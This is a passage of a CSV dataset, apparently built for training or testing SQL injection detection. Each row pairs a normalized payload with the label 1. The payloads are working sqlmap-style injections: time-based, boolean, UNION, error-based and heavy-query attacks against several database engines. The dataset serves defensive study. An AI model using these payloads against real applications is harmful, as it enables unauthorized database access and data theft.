row_index,payload_norm,label,sqli_type_hint
11040,1' in boolean mode ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) #,1,
11041,1'|| ( select 'mnvk' from dual where 4181 = 4181,1,
11042,"1' in boolean mode ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,
11043,"1' ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( 'qfwc' = 'qfwc",1,
11044,"1"" ) ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( ""wute"" like ""wute",1,
11045,"-8347%' ) union all select 7643,7643,7643--",1,
11046,select ( case when ( 8993 = 4660 ) then 1 else 8993* ( select 8993 from master..sysdatabases ) end ) --,1,
11047,"-6017 union all select 8449,8449,8449--",1,
11048,"1"" ) union all select null,null,null,null,null,null,null,null,null,null#",1,
11049,1 ) ) as hxzh where 9284 = 9284,1,
11050,1' and ( 3020 = 3020 ) *6703 and 'qsrz' = 'qsrz,1,
11051,"1"" ) as oijn where 1521 = 1521 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
11052,waitfor delay '0:0:5',1,
11053,"1 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) # jpau",1,
11054,1 and 2006 = 2006,1,
11055,"1' ) ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( 'wsmq' = 'wsmq",1,
11056,1'|| ( select 'ucro' where 9912 = 9912 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,1,
11057,"1' where 2162 = 2162 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1,
11058,"1' ) where 3331 = 3331 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
11059,"1"" where 4066 = 4066 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) --",1,
11060,"-3609"" ) ) as fzyp where 9474 = 9474 or 9323 = 9323#",1,
11061,"-6335"" ) ) ) union all select 3654--",1,
11062,"1' ) ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
11063,"1"" ) as fgne where 7207 = 7207",1,
11064,"1"" and 4288 = 3696 and ""qqam"" like ""qqam",1,
11065,"1' or elt ( 6272 = 6272,sleep ( 5 ) ) and 'wdoi' = 'wdoi",1,
11066,"1"" or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )",1,
11067,1' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 'ykjs' like 'ykjs,1,
11068,-9875' ) or ( 8459 = 8459 ) *4906 and ( 'mrxw' = 'mrxw,1,
11069,"1"" ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( ""gfwz"" = ""gfwz",1,
